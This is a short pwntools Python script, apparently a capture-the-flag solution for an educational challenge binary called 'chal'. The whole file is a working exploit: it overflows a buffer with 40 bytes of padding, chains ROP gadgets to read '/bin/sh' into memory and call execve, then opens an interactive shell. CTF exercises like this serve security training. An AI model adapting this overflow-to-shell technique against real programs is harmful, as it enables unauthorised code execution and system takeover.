from pwn import *

context.arch = 'amd64'
p = process("chal")
#p = remote("edu-ctf.zoolab.org", 10003)

p.recvuntil(b"show me rop\n> ")
pop_rdi = 0x40181a
pop_rsi = 0x40f14e
pop_rdx = 0x40171f
pop_rax = 0x448e67
syscall = 0x416a54
bss_addr = 0x4C2270

payload = flat(
    b"A" * 40,
    pop_rdi,
    0x0,
    pop_rsi,
    bss_addr,
    pop_rdx,
    0x10,
    pop_rax,
    0x0,
    syscall,
    pop_rdi,
    bss_addr,
    pop_rsi,
    0x0,
    pop_rdx,
    0x0,
    pop_rax,
    0x3b,
    syscall
)
p.send(payload)
sleep(0.1)
p.send(b"/bin/sh")
p.interactive()
